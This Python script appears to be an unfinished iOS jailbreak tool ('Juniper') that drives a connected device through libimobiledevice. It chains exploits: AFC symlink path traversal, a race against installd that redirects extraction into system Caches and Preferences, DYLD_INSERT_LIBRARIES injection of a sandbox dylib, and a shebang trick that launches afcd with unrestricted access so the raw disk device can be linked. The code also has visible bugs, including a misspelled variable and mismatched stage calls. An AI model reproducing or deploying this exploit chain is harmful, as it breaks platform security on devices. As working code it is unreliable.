import sys, os
import imobiledevice
from imobiledevice import *
import libarchive
from subprocess import call
from zipfile import ZipFile
import plist, plistlib
from time import sleep
import tempfile
import shutil
import jsonpickle

current_dir = os.getcwd()

descriptor = None
port = 0
descriptor_json = ""

tmp_dir = tempfile.mkdtemp()
print(tmp_dir)
os.chdir(tmp_dir)

def get_lockdown():
	while True:
		try:
			ld = LockdownClient(iDevice())
			return ld
		except iDeviceError:
			continue
		except LockdownError:
			continue

def get_client(service_class):
        ld = get_lockdown()
        return ld.get_service_client(service_class)

def get_afc():
	return get_client(AfcClient)

def get_fr():
	return get_client(FileRelayClient)

def get_drr():
	return get_client(DiagnosticsRelayClient)

def get_ip():
	return get_client(InstallationProxyClient)

ld = get_lockdown()

afc = get_afc()
fr = get_fr()
drr = get_drr()
ip = get_ip()

afc_unrestricted = None

def upload_recursively(folder, destination):
        for x in os.walk(folder):
                afc.make_directory(destination + "/" + x[0])

                for file in x[2]:
                        with afc.open(destination + "/" + x[0] + "/" + file, "w+") as rfile:
                                local_file = open(x[0] + "/" + file, "r+")
                                rfile.write(local_file.read())

def upload_app_stage_1():
	print("== Uploading Juniper app (1/2) ==")
	
	print(" - Extracting IPA")
	
	shutil.copyfile(os.path.join(current_dir, "jailbreak.ipa"), "jailbreak.ipa")
	
	with ZipFile("jailbreak.ipa", "r") as ipa:
		ipa.extractall(tmp_dir)
	
	print(" - Uploading app")
	
	os.chdir("Payload")
	
	upload_recursively("Jailbreaker.app", "Downloads")

def upload_app_stage_3(order, message):
	try:
		if message.get("Status").get_value() != "Complete":
			return
	except AttributeError:
		return
	
	afc = get_afc()
	
	print("== Uploading Juniper app (3/3) ==")
	print(" - Modifying files")
	
	os.chdir(current_dir)
	with afc.open("Downloads/sandbox.dylib", "w+") as sandbox, open("codesign/sandbox.dylib", "r") as sandbox_local:
		sandbox.write(sandbox_local.read())
	os.chdir(tmp_dir)
	
	configure_system_stage_1()
	configure_system_stage_2()
	own_block_device()
	modify_root_filesystem()

def upload_app_stage_2():
	print("== Uploading Juniper app (2/3) ==")
	print(" - Modifying Info.plist")
	
	os.chdir("Jailbreaker.app")
	
	call(["plistutil", "-i", "Info.plist", "-o", "Info.plist.tmp"])
	
	file_contents = ""
	next_is_executable = False
	
	with open("Info.plist.tmp", "r") as info:
		for line in info:
			if next_is_executable and line.find("..") == -1:
				file_contents += line.replace("Jailbreaker", "../../../../../../var/mobile/Media/Downloads/Jailbreaker.app/Jailbreaker")
				next_is_executable = False
			elif next_is_executable:
				next_is_executable = False
			else:
				if line.find("CFBundleExecutable") != -1:
					next_is_executable = True
				file_contents += line
	
	with open("Info.plist.tmp", "w") as info:
		info.write(file_contents)
	
	call(["plistutil", "-i", "Info.plist.tmp", "-o", "Info.plist"])
	
	os.remove("Info.plist.tmp")
	
	os.chdir(tmp_dir)
	
	print(" - Packaging Juniper app")
	
	with ZipFile("jailbreak_modified.ipa", "w") as repackaged_app:
		repackaged_app.write("iTunesArtwork")
		repackaged_app.write("iTunesMetadata.plist")
		
		for x in os.walk("Payload"):
			for child in x[2]:
				repackaged_app.write(x[0] + "/" + child)
	
	print(" - Installing Juniper app")
	
	afc.make_directory("/PublicStaging")
	
	with afc.open("/PublicStaging/jailbreak.ipa", "w") as remote_app:
		with open("jailbreak_modified.ipa", "r") as local_app:
			remote_app.write(local_app.read())
		
	install_dict = plist.from_xml("<plist><dict><key>CFBundleIdentifier</key><string>com.trinitigame.jailbreakerfull</string></dict></plist>")
	ip.install("/PublicStaging/jailbreak.ipa", install_dict, upload_app_stage_3)
	
	print(" - Please wait for the app to install...")
	
	while True:
		sleep(0.1)

def configure_system_stage_1(): 
	print("== Configuring system (1/2) ==")
	print(" - Working AFC magic")
	
	afc.make_directory("Downloads/a")
	afc.make_directory("Downloads/a/a")
	afc.make_directory("Downloads/a/a/a")
	afc.make_directory("Downloads/a/a/a/a")
	afc.make_directory("Downloads/a/a/a/a/a")
	
	afc.symlink("../../../../../tmp", "Downloads/a/a/a/a/a/link")
	afc.rename_path("Downloads/a/a/a/a/a/link", "tmp")

def log_args(order, message):
	print("Order: " + str(order))
	print("Message: " + str(message))

def race_installd(zip_file, destination):
	ip = get_ip()
	
	try:
		while True:
			with afc.open("/PublicStaging/" + zip_file, "w") as remote:
				with open(zip_file, "r") as local:
					remote.write(local.read())
					print("Uploaded file!")
			
			options = plist.from_xml("<plist><dict><key>CFBundleIdentifier</key><string>juniper.installd.race</string></dict></plist>")
			
			try:
				ip.install("/PublicStaging/" + zip_file, options)
				print("Tried to install the file.")
			except:
				pass
			
			while True:
				tmp_contents = afc.read_directory("/tmp")
				matching_entries = [i for i in tmp_contents if i.find("install_staging.") != -1]
				
				if len(matching_entries) is 0:
					continue
				
				entry = matching_entries[0]
				
				staging_contents = afc.read_directory("/tmp/" + entry)
				
				if len(staging_contents) is 2:
					print(" - Succeeded before extraction!")
					afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
					raise StopIteration
				else:
					foo_contents = afc.read_directory("/tmp/" + entry + "/foo_extracted")
					
					if len(foo_contents) is 2:
						print(" - Succeeded during extraction!")
						afc.rename_path("/tmp/" + entry + "/foo_extracted", "/tmp/" + entry + "/foo_extracted.old")
						afc.symlink("../../../" + destination, "/tmp/" + entry + "/foo_extracted")
						raise StopIteration
	except StopIteration:
		return True

def configure_system_stage_2():
	print("== Configuring system (2/2) ==")
	print(" - Requesting cache")
	
	os.chdir(tmp_dir)
	
	conn = fr.request_sources(["Caches"])
	
	with open("caches.cpio.gz", "wb+") as dumpfile:
		while (1):
			try:
				data = conn.receive_timeout(4096, 10)
				dumpfile.write(data)
			except Exception, e:
				if e.code == -2:
					break;
				raise e
	
	try:
		libarchive.extract.extract_file("caches.cpio.gz")
		libarchive.extract.extract_file("caches.cpio")
	except:
		pass
	
	print(" - Got the cache!")
	
	os.chdir("var/mobile/Library/Caches")
	
	call(["plistutil", "-i", "com.apple.mobile.installation.plist", "-o", "com.apple.mobile.installation.plist.tmp"])
	
	file_contents = ""
	
	next_instance = False
	no_more = False
	
	with open("com.apple.mobile.installation.plist.tmp", "r") as install_cache:
		for line in install_cache:
			file_contents += line
	
			if line.find("com.trinitigame.jailbreakerfull") is not -1 and not no_more:
				print("next instance")
				next_instance = True
			
			if next_instance and line.find("/tmp") is not -1:
				file_contents += "\t\t\t\t<key>DYLD_INSERT_LIBRARIES</key>\n"
				file_contents += "\t\t\t\t<string>/var/mobile/Media/Downloads/sandbox.dylib</string>\n"
				next_instance = False
				no_more = True
	
	with open("com.apple.mobile.installation.plist", "w") as install_cache:
		install_cache.write(file_contents)
	
	os.remove("com.apple.mobile.installation.plist.tmp")
	
	with open("com.apple.LaunchServices-045.csstore", "w") as launch_services:
		launch_services.write("")
	
	os.chdir(tmp_dir)
	
	ld = get_lockdown()
	
	ios_version = ld.get_value(None, "BuildVersion").get_value()
	
	print("God fucking dammit")
	
	with open("com.apple.backboardd.plist", "w") as backboardd:
		backboardd.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
		backboardd.write("<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">")
		backboardd.write("<plist version=\"1.0\">")
		backboardd.write("<dict>")
		backboardd.write("\t<key>BKDataMigratorLastSystemVersion</key>")
		backboardd.write("\t<string>" + ios_version + "</string>")
		backboardd.write("\t<key>BKNoWatchdogs</key>")
		backboardd.write("\t<string>Yes</string>")
		backboardd.write("\t<key>InvertColorsEnabled</key>")
		backboardd.write("\t<false />")
		backboardd.write("</dict>")
		backboardd.write("</plist>")
	
	call(["truncate", "-s", "1M", "AAAAABREATHESAAAAA"])
	
	with ZipFile("caches.zip", "w") as caches:
		os.chdir("var/mobile/Library/Caches")
		caches.write("com.apple.mobile.installation.plist")
		caches.write("com.apple.LaunchServices-045.csstore")
		os.chdir(tmp_dir)
	
	with ZipFile("preferences.zip", "w") as preferences:
		preferences.write("AAAAABREATHESAAAAA")
		preferences.write("com.apple.backboardd.plist")
	
	print(" - Attempting to race installd (1)")
	
	if race_installd("caches.zip", "/var/mobile/Library/Caches/") == 1:
		print(" - Success!")
	
	print(" - Attempting to race installd (2)")
	print(" - (This one might take a bit longer, but don't worry!)")
	
	if race_installd("preferences.zip", "/var/mobile/Library/Preferences/") == 1:
		print(" - Success!")
	
	print(" - Rebooting, please click on the Juniper app when I say so!")
	
	drr.restart(0)

def own_block_device():
	print(" - Waiting for reboot...")
	
	ld = get_lockdown()
	
	afc = get_afc()
	drr = get_drr()
	
	while True:
		try:
			descriptor = ld.start_service(AfcClient)
			port = descriptor.port
		except:
			print("Port: " + str(port))
			break
	
	afc = get_afc()
	
	with afc.open("Downloads/Jailbreaker.app/Jailbreaker", "w") as executable:
		executable.write("#!/usr/libexec/afcd -S -d / -p " + str(port) + " # -- ")
	
	print("== Alright, click on the icon! ==")
	
	sleep(1)
	print("We are now trying to get the client")
	while True:
		try:
			afc_unrestricted = AfcClient(iDevice(), descriptor)
			
			print("We actually fuckin' did it.")
			print(dir(afc_unrestricted))
			
			break
		except:
			pass
	
	while True:
		try:
			afc_unresricted.symlink("..", "/var/mobile/Media/testy")
			afc_unresricted.read_directory("/var/mobile/Media/testy")
			afc_unresricted.symlink("../../../../../dev/rdisk0s1s1", "/var/mobile/Library/Logs/AppleSupport")
			afc_unresricted.remove_path("/var/mobile/Media/testy")
			
			break
		except:
			pass
	
	drr.restart(0)

def modify_root_filesystem():
	ld = get_lockdown()
	
	afc = get_afc()
	drr = get_drr()
	
	print("Well, I mean we got this far.")

upload_app_stage_1()
upload_app_stage_2()
upload_app_stage_3()
